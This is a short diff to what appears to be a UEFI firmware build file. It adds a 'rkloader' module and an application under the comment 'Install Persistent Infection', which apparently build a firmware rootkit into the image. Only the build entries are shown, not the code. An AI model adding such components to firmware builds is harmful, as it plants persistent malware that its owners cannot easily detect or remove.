@@ -555,3 +555,13 @@
 !endif
 
   NtfsPkg/NtfsDxe/Ntfs.inf
+  rkloader/rkloader.inf
+#
+#  Install Persistent Infection
+#
+MdeModulePkg/Application/fsbg/fsbg.inf
+
+#
+# reset fTA flag
+#
+MdeModulePkg/Application/ReSetfTA/ReSetfTA.inf
